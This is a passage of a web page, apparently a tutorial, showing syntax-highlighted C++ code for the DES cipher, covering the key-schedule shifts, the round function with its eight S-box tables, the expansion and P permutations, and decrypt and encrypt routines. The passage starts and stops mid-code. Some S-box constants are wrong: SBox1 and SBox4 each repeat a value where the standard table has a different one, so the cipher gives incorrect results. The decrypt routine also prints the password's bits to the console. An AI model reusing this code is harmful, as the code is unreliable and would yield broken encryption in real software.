class="hljs-built_in">PCTwo</span>(realKey);<br><br>subkey[r] = compressKey;<br>&#125;<br>&#125;<br><br><span class="hljs-function">bitset&lt;28&gt; <span class="hljs-title">leftShift</span><span class="hljs-params">(bitset&lt;<span class="hljs-number">28</span>&gt; temKey, <span class="hljs-type">int</span> r)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> shift = <span class="hljs-number">0</span>;<br>bitset&lt;28&gt; tem = temKey;<br><span class="hljs-keyword">if</span> (r == <span class="hljs-number">0</span> || r == <span class="hljs-number">1</span> || r == <span class="hljs-number">8</span> || r == <span class="hljs-number">15</span>)<br>&#123;<br>shift = <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>shift = <span class="hljs-number">2</span>;<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">27</span>; i &gt;= <span class="hljs-number">0</span>; i--)<br>&#123;<br><span class="hljs-keyword">if</span> ((i - shift) &lt; <span class="hljs-number">0</span>)<br>&#123;<br>tem[i] = temKey[i - shift + <span class="hljs-number">28</span>];<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>tem[i] = temKey[i - shift];<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> tem;<br>&#125;<br><br><span class="hljs-function">bitset&lt;32&gt; <span class="hljs-title">f</span><span class="hljs-params">(bitset&lt;<span class="hljs-number">32</span>&gt; right, bitset&lt;<span class="hljs-number">48</span>&gt; subkey)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> SBox1[] = &#123;<br><span class="hljs-number">14</span>, <span class="hljs-number">4</span>, <span class="hljs-number">13</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">15</span>, <span class="hljs-number">11</span>, <span class="hljs-number">8</span>, <span class="hljs-number">3</span>, <span class="hljs-number">10</span>, <span class="hljs-number">6</span>, <span class="hljs-number">12</span>, <span class="hljs-number">5</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>,<br><span class="hljs-number">0</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">2</span>, <span class="hljs-number">13</span>, <span class="hljs-number">1</span>, <span class="hljs-number">10</span>, <span class="hljs-number">6</span>, <span class="hljs-number">12</span>, <span class="hljs-number">11</span>, <span class="hljs-number">9</span>, <span class="hljs-number">5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">8</span>,<br><span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">14</span>, <span class="hljs-number">8</span>, <span class="hljs-number">13</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">11</span>, <span class="hljs-number">15</span>, <span class="hljs-number">12</span>, <span class="hljs-number">9</span>, <span class="hljs-number">7</span>, <span class="hljs-number">3</span>, <span class="hljs-number">10</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>,<br><span class="hljs-number">15</span>, <span class="hljs-number">12</span>, <span class="hljs-number">8</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">9</span>, <span class="hljs-number">1</span>, <span class="hljs-number">7</span>, <span class="hljs-number">5</span>, <span class="hljs-number">11</span>, <span class="hljs-number">3</span>, <span class="hljs-number">14</span>, <span class="hljs-number">10</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">13</span>&#125;;<br><br><span class="hljs-type">int</span> SBox2[] = &#123;<br><span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">14</span>, <span class="hljs-number">6</span>, <span class="hljs-number">11</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">9</span>, <span class="hljs-number">7</span>, <span class="hljs-number">2</span>, <span class="hljs-number">13</span>, <span class="hljs-number">12</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">10</span>,<br><span class="hljs-number">3</span>, <span class="hljs-number">13</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>, <span class="hljs-number">15</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">14</span>, <span class="hljs-number">12</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">10</span>, <span class="hljs-number">6</span>, <span class="hljs-number">9</span>, <span class="hljs-number">11</span>, <span class="hljs-number">5</span>,<br><span class="hljs-number">0</span>, <span class="hljs-number">14</span>, <span class="hljs-number">7</span>, <span class="hljs-number">11</span>, <span class="hljs-number">10</span>, <span class="hljs-number">4</span>, <span class="hljs-number">13</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">12</span>, <span class="hljs-number">6</span>, <span class="hljs-number">9</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">15</span>,<br><span class="hljs-number">13</span>, <span class="hljs-number">8</span>, <span class="hljs-number">10</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">15</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">11</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">12</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">14</span>, <span class="hljs-number">9</span>&#125;;<br><br><span class="hljs-type">int</span> SBox3[] = &#123;<br><span class="hljs-number">10</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">14</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>, <span class="hljs-number">15</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">13</span>, <span class="hljs-number">12</span>, <span class="hljs-number">7</span>, <span class="hljs-number">11</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>,<br><span class="hljs-number">13</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">10</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>, <span class="hljs-number">14</span>, <span class="hljs-number">12</span>, <span class="hljs-number">11</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>,<br><span class="hljs-number">13</span>, <span class="hljs-number">6</span>, <span class="hljs-number">4</span>, <span class="hljs-number">9</span>, <span class="hljs-number">8</span>, <span class="hljs-number">15</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">11</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">12</span>, <span class="hljs-number">5</span>, <span class="hljs-number">10</span>, <span class="hljs-number">14</span>, <span class="hljs-number">7</span>,<br><span class="hljs-number">1</span>, <span class="hljs-number">10</span>, <span class="hljs-number">13</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">9</span>, <span class="hljs-number">8</span>, <span class="hljs-number">7</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">14</span>, <span class="hljs-number">3</span>, <span class="hljs-number">11</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2</span>, <span class="hljs-number">12</span>&#125;;<br><br><span class="hljs-type">int</span> SBox4[] = &#123;<br><span class="hljs-number">7</span>, <span class="hljs-number">13</span>, <span class="hljs-number">14</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>, <span class="hljs-number">11</span>, <span class="hljs-number">12</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>,<br><span class="hljs-number">12</span>, <span class="hljs-number">8</span>, <span class="hljs-number">11</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>, <span class="hljs-number">2</span>, <span class="hljs-number">12</span>, <span class="hljs-number">1</span>, <span class="hljs-number">10</span>, <span class="hljs-number">14</span>, <span class="hljs-number">9</span>,<br><span class="hljs-number">10</span>, <span class="hljs-number">6</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">12</span>, <span class="hljs-number">11</span>, <span class="hljs-number">7</span>, <span class="hljs-number">13</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">14</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>,<br><span class="hljs-number">3</span>, <span class="hljs-number">15</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">10</span>, <span class="hljs-number">1</span>, <span class="hljs-number">13</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">11</span>, <span class="hljs-number">12</span>, <span class="hljs-number">7</span>, <span class="hljs-number">2</span>, <span class="hljs-number">14</span>&#125;;<br><br><span class="hljs-type">int</span> SBox5[] = &#123;<br><span class="hljs-number">2</span>, <span class="hljs-number">12</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">7</span>, <span class="hljs-number">10</span>, <span class="hljs-number">11</span>, <span class="hljs-number">6</span>, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">15</span>, <span class="hljs-number">13</span>, <span class="hljs-number">0</span>, <span class="hljs-number">14</span>, <span class="hljs-number">9</span>,<br><span class="hljs-number">14</span>, <span class="hljs-number">11</span>, <span class="hljs-number">2</span>, <span class="hljs-number">12</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>, <span class="hljs-number">13</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">3</span>, <span class="hljs-number">9</span>, <span class="hljs-number">8</span>, <span class="hljs-number">6</span>,<br><span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">11</span>, <span class="hljs-number">10</span>, <span class="hljs-number">13</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">15</span>, <span class="hljs-number">9</span>, <span class="hljs-number">12</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">14</span>,<br><span class="hljs-number">11</span>, <span class="hljs-number">8</span>, <span class="hljs-number">12</span>, <span class="hljs-number">7</span>, <span class="hljs-number">1</span>, <span class="hljs-number">14</span>, <span class="hljs-number">2</span>, <span class="hljs-number">13</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">3</span>&#125;;<br><br><span class="hljs-type">int</span> SBox6[] = &#123;<br><span class="hljs-number">12</span>, <span class="hljs-number">1</span>, <span class="hljs-number">10</span>, <span class="hljs-number">15</span>, <span class="hljs-number">9</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>, <span class="hljs-number">13</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">14</span>, <span class="hljs-number">7</span>, <span class="hljs-number">5</span>, <span class="hljs-number">11</span>,<br><span class="hljs-number">10</span>, <span class="hljs-number">15</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">7</span>, <span class="hljs-number">12</span>, <span class="hljs-number">9</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">13</span>, <span class="hljs-number">14</span>, <span class="hljs-number">0</span>, <span class="hljs-number">11</span>, <span class="hljs-number">3</span>, <span class="hljs-number">8</span>,<br><span class="hljs-number">9</span>, <span class="hljs-number">14</span>, <span class="hljs-number">15</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">12</span>, <span class="hljs-number">3</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">10</span>, <span class="hljs-number">1</span>, <span class="hljs-number">13</span>, <span class="hljs-number">11</span>, <span class="hljs-number">6</span>,<br><span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">12</span>, <span class="hljs-number">9</span>, <span class="hljs-number">5</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">11</span>, <span class="hljs-number">14</span>, <span class="hljs-number">1</span>, <span class="hljs-number">7</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>, <span class="hljs-number">13</span><br><br>&#125;;<br><br><span class="hljs-type">int</span> SBox7[] = &#123;<br><span class="hljs-number">4</span>, <span class="hljs-number">11</span>, <span class="hljs-number">2</span>, <span class="hljs-number">14</span>, <span class="hljs-number">15</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>, <span class="hljs-number">13</span>, <span class="hljs-number">3</span>, <span class="hljs-number">12</span>, <span class="hljs-number">9</span>, <span class="hljs-number">7</span>, <span class="hljs-number">5</span>, <span class="hljs-number">10</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>,<br><span class="hljs-number">13</span>, <span class="hljs-number">0</span>, <span class="hljs-number">11</span>, <span class="hljs-number">7</span>, <span class="hljs-number">4</span>, <span class="hljs-number">9</span>, <span class="hljs-number">1</span>, <span class="hljs-number">10</span>, <span class="hljs-number">14</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">12</span>, <span class="hljs-number">2</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">6</span>,<br><span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">11</span>, <span class="hljs-number">13</span>, <span class="hljs-number">12</span>, <span class="hljs-number">3</span>, <span class="hljs-number">7</span>, <span class="hljs-number">14</span>, <span class="hljs-number">10</span>, <span class="hljs-number">15</span>, <span class="hljs-number">6</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">9</span>, <span class="hljs-number">2</span>,<br><span class="hljs-number">6</span>, <span class="hljs-number">11</span>, <span class="hljs-number">13</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">10</span>, <span class="hljs-number">7</span>, <span class="hljs-number">9</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">15</span>, <span class="hljs-number">14</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">12</span>&#125;;<br><br><span class="hljs-type">int</span> SBox8[] = &#123;<br><span class="hljs-number">13</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">11</span>, <span class="hljs-number">1</span>, <span class="hljs-number">10</span>, <span class="hljs-number">9</span>, <span class="hljs-number">3</span>, <span class="hljs-number">14</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">12</span>, <span class="hljs-number">7</span>,<br><span class="hljs-number">1</span>, <span class="hljs-number">15</span>, <span class="hljs-number">13</span>, <span class="hljs-number">8</span>, <span class="hljs-number">10</span>, <span class="hljs-number">3</span>, <span class="hljs-number">7</span>, <span class="hljs-number">4</span>, <span class="hljs-number">12</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">11</span>, <span class="hljs-number">0</span>, <span class="hljs-number">14</span>, <span class="hljs-number">9</span>, <span class="hljs-number">2</span>,<br><span class="hljs-number">7</span>, <span class="hljs-number">11</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">9</span>, <span class="hljs-number">12</span>, <span class="hljs-number">14</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">10</span>, <span class="hljs-number">13</span>, <span class="hljs-number">15</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>,<br><span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">14</span>, <span class="hljs-number">7</span>, <span class="hljs-number">4</span>, <span class="hljs-number">10</span>, <span class="hljs-number">8</span>, <span class="hljs-number">13</span>, <span class="hljs-number">15</span>, <span class="hljs-number">12</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">11</span>&#125;;<br><br>bitset&lt;48&gt; rightExpend;<br>bitset&lt;6&gt; e1, e2, e3, e4, e5, e6, e7, e8;<br>bitset&lt;4&gt; sbox1, sbox2, sbox3, sbox4, sbox5, sbox6, sbox7, sbox8;<br><span class="hljs-comment">//Extend</span><br>rightExpend = <span class="hljs-built_in">Expend</span>(right);<br><br>rightExpend = rightExpend ^ subkey;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; i++)<br>&#123;<br>e1[i] = rightExpend[<span class="hljs-number">47</span> - <span class="hljs-number">0</span> - i];<br>e2[i] = rightExpend[<span class="hljs-number">47</span> - <span class="hljs-number">6</span> - i];<br>e3[i] = rightExpend[<span class="hljs-number">47</span> - <span class="hljs-number">12</span> - i];<br>e4[i] = rightExpend[<span class="hljs-number">47</span> - <span class="hljs-number">18</span> - i];<br>e5[i] = rightExpend[<span class="hljs-number">47</span> - <span class="hljs-number">24</span> - i];<br>e6[i] = rightExpend[<span class="hljs-number">47</span> - <span class="hljs-number">30</span> - i];<br>e7[i] = rightExpend[<span class="hljs-number">47</span> - <span class="hljs-number">36</span> - i];<br>e8[i] = rightExpend[<span class="hljs-number">47</span> - <span class="hljs-number">42</span> - i];<br>&#125;<br><br>sbox1 = <span class="hljs-built_in">SBox</span>(e1, SBox1);<br>sbox2 = <span class="hljs-built_in">SBox</span>(e2, SBox2);<br>sbox3 = <span class="hljs-built_in">SBox</span>(e3, SBox3);<br>sbox4 = <span class="hljs-built_in">SBox</span>(e4, SBox4);<br>sbox5 = <span class="hljs-built_in">SBox</span>(e5, SBox5);<br>sbox6 = <span class="hljs-built_in">SBox</span>(e6, SBox6);<br>sbox7 = <span class="hljs-built_in">SBox</span>(e7, SBox7);<br>sbox8 = <span class="hljs-built_in">SBox</span>(e8, SBox8);<br><br>bitset&lt;32&gt; result;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>&#123;<br>result[i + <span class="hljs-number">0</span>] = sbox1[i];<br>result[i + <span class="hljs-number">4</span>] = sbox2[i];<br>result[i + <span class="hljs-number">8</span>] = sbox3[i];<br>result[i + <span class="hljs-number">12</span>] = sbox4[i];<br>result[i + <span class="hljs-number">16</span>] = sbox5[i];<br>result[i + <span class="hljs-number">20</span>] = sbox6[i];<br>result[i + <span class="hljs-number">24</span>] = sbox7[i];<br>result[i + <span class="hljs-number">28</span>] = sbox8[i];<br>&#125;<br><br>bitset&lt;32&gt; temp = result;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++)<br>&#123;<br>result[i] = temp[<span class="hljs-number">31</span> - i];<br>&#125;<br><br><span class="hljs-comment">//P</span><br>result = <span class="hljs-built_in">P</span>(result);<br><span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-function">bitset&lt;48&gt; <span class="hljs-title">Expend</span><span class="hljs-params">(bitset&lt;<span class="hljs-number">32</span>&gt; src)</span></span><br><span class="hljs-function"></span>&#123;<br><br>bitset&lt;48&gt; output;<br><br><span class="hljs-type">int</span> E_TABLE[] = &#123;<br><span class="hljs-number">32</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>,<br><span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>,<br><span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">11</span>, <span class="hljs-number">12</span>, <span class="hljs-number">13</span>,<br><span class="hljs-number">12</span>, <span class="hljs-number">13</span>, <span class="hljs-number">14</span>, <span class="hljs-number">15</span>, <span class="hljs-number">16</span>, <span class="hljs-number">17</span>,<br><span class="hljs-number">16</span>, <span class="hljs-number">17</span>, <span class="hljs-number">18</span>, <span class="hljs-number">19</span>, <span class="hljs-number">20</span>, <span class="hljs-number">21</span>,<br><span class="hljs-number">20</span>, <span class="hljs-number">21</span>, <span class="hljs-number">22</span>, <span class="hljs-number">23</span>, <span class="hljs-number">24</span>, <span class="hljs-number">25</span>,<br><span class="hljs-number">24</span>, <span class="hljs-number">25</span>, <span class="hljs-number">26</span>, <span class="hljs-number">27</span>, <span class="hljs-number">28</span>, <span class="hljs-number">29</span>,<br><span class="hljs-number">28</span>, <span class="hljs-number">29</span>, <span class="hljs-number">30</span>, <span class="hljs-number">31</span>, <span class="hljs-number">32</span>, <span class="hljs-number">1</span>&#125;;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">48</span>; i++)<br>&#123;<br>output[<span class="hljs-number">47</span> - i] = src[<span class="hljs-number">32</span> - E_TABLE[i]];<br>&#125;<br><br><span class="hljs-keyword">return</span> output;<br>&#125;<br><br><span class="hljs-function">bitset&lt;4&gt; <span class="hljs-title">SBox</span><span class="hljs-params">(bitset&lt;<span class="hljs-number">6</span>&gt; tem, <span class="hljs-type">int</span> *sbox)</span></span><br><span class="hljs-function"></span>&#123;<br><br><span class="hljs-type">int</span> row = <span class="hljs-number">0</span>, col = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> box = <span class="hljs-number">0</span>;<br>row = tem[<span class="hljs-number">0</span>] * <span class="hljs-number">2</span> + tem[<span class="hljs-number">5</span>];<br>col = tem[<span class="hljs-number">1</span>] * <span class="hljs-number">2</span> * <span class="hljs-number">2</span> * <span class="hljs-number">2</span> + tem[<span class="hljs-number">2</span>] * <span class="hljs-number">2</span> * <span class="hljs-number">2</span> + tem[<span class="hljs-number">3</span>] * <span class="hljs-number">2</span> + tem[<span class="hljs-number">4</span>];<br><br>box = sbox[row * <span class="hljs-number">16</span> + col];<br><br><span class="hljs-function">bitset&lt;4&gt; <span class="hljs-title">temp</span><span class="hljs-params">(box)</span></span>;<br>bitset&lt;4&gt; output;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>&#123;<br>output[i] = temp[<span class="hljs-number">3</span> - i];<br>&#125;<br><br><span class="hljs-keyword">return</span> output;<br>&#125;<br><br><span class="hljs-function">bitset&lt;32&gt; <span class="hljs-title">P</span><span class="hljs-params">(bitset&lt;<span class="hljs-number">32</span>&gt; src)</span></span><br><span class="hljs-function"></span>&#123;<br>bitset&lt;32&gt; output;<br><br><span class="hljs-type">int</span> P_TABLE[] = &#123;<br><span class="hljs-number">16</span>, <span class="hljs-number">7</span>, <span class="hljs-number">20</span>, <span class="hljs-number">21</span>,<br><span class="hljs-number">29</span>, <span class="hljs-number">12</span>, <span class="hljs-number">28</span>, <span class="hljs-number">17</span>,<br><span class="hljs-number">1</span>, <span class="hljs-number">15</span>, <span class="hljs-number">23</span>, <span class="hljs-number">26</span>,<br><span class="hljs-number">5</span>, <span class="hljs-number">18</span>, <span class="hljs-number">31</span>, <span class="hljs-number">10</span>,<br><span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">24</span>, <span class="hljs-number">14</span>,<br><span class="hljs-number">32</span>, <span class="hljs-number">27</span>, <span class="hljs-number">3</span>, <span class="hljs-number">9</span>,<br><span class="hljs-number">19</span>, <span class="hljs-number">13</span>, <span class="hljs-number">30</span>, <span class="hljs-number">6</span>,<br><span class="hljs-number">22</span>, <span class="hljs-number">11</span>, <span class="hljs-number">4</span>, <span class="hljs-number">25</span>&#125;;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++)<br>&#123;<br>output[<span class="hljs-number">31</span> - i] = src[<span class="hljs-number">32</span> - P_TABLE[i]];<br>&#125;<br><br><span class="hljs-keyword">return</span> output;<br>&#125;<br><br><span class="hljs-comment">//DES 解密</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Decrypt</span><span class="hljs-params">(string &amp;c)</span></span><br><span class="hljs-function"></span>&#123;<br>string text = c;<br>string key;<br><br>cout &lt;&lt; <span class="hljs-string">&quot;Input password:(8 char)&quot;</span> &lt;&lt; endl;<br>cin &gt;&gt; key;<br><span class="hljs-keyword">while</span> (key.<span class="hljs-built_in">length</span>() != <span class="hljs-number">8</span>)<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;Input error( need 8 char )&quot;</span> &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;Input password:(8 char)&quot;</span> &lt;&lt; endl;<br>cin &gt;&gt; key;<br>&#125;<br><br>bitset&lt;64&gt; textBits;<br>bitset&lt;64&gt; keyBits;<br>bitset&lt;32&gt; leftBits;<br>bitset&lt;32&gt; rightBits;<br>bitset&lt;32&gt; newLeftBits;<br>bitset&lt;32&gt; newRightBits;<br>bitset&lt;64&gt; cipher;<br>bitset&lt;64&gt; tem;<br><br>textBits = <span class="hljs-built_in">CharsToBitset</span>(c.<span class="hljs-built_in">c_str</span>());<br>keyBits = <span class="hljs-built_in">CharsToBitset</span>(key.<span class="hljs-built_in">c_str</span>());<br><span class="hljs-built_in">Subkey</span>(keyBits);<br>cout &lt;&lt; <span class="hljs-string">&quot;ciph&quot;</span> &lt;&lt; textBits.<span class="hljs-built_in">to_string</span>() &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;pass&quot;</span> &lt;&lt; keyBits.<span class="hljs-built_in">to_string</span>() &lt;&lt; endl;<br>tem = textBits;<br>textBits = <span class="hljs-built_in">IP</span>(tem); <span class="hljs-comment">//IP 置换</span><br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">32</span>; i &lt; <span class="hljs-number">64</span>; i++)<br>&#123;<br>leftBits[i - <span class="hljs-number">32</span>] = textBits[i];<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++)<br>&#123;<br>rightBits[i] = textBits[i];<br>&#125;<br><br><span class="hljs-comment">//16次迭代</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++)<br>&#123;<br>newLeftBits = rightBits;<br>newRightBits = leftBits ^ <span class="hljs-built_in">f</span>(rightBits, subkey[<span class="hljs-number">15</span> - i]);<br>leftBits = newLeftBits;<br>rightBits = newRightBits;<br>&#125;<br><br><span class="hljs-comment">//W 置换</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++)<br>&#123;<br>tem[i] = leftBits[i];<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">32</span>; i &lt; <span class="hljs-number">64</span>; i++)<br>&#123;<br>tem[i] = rightBits[i - <span class="hljs-number">32</span>];<br>&#125;<br><br><span class="hljs-comment">//IP 逆置换</span><br>cipher = <span class="hljs-built_in">InverseIP</span>(tem);<br>c = cipher.<span class="hljs-built_in">to_string</span>();<br>cout &lt;&lt; <span class="hljs-string">&quot;text&quot;</span> &lt;&lt; c &lt;&lt; endl;<br>c = <span class="hljs-built_in">BitsetToString</span>(cipher);<br>cout &lt;&lt; <span class="hljs-string">&quot;text&quot;</span> &lt;&lt; c &lt;&lt; endl;<br>&#125;<br><br><span class="hljs-comment">//DES 加密</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Encrypt</span><span class="hljs-params">(string &amp;c)</span></span><br><span class="hljs-function"></span>&#123;<br>string text;<br>string key;<br>cout &lt;&lt; <span class="hljs-string">&quot;Input text:(8 char)&quot;</span> &lt;&lt; endl;<br>cin &gt;&gt; text;<br>cout &lt;&lt; <span class="hljs-string">&quot;Input password:(8 char)&quot;</span> &lt;&lt; endl;<br>cin &gt;&gt; key;<br><span class="hljs-keyword">while</span> (text.<span class="hljs-built_in">length</span>() != <span class="hljs-number">8</span> || key.<span class="hljs-built_in">length</span>() != 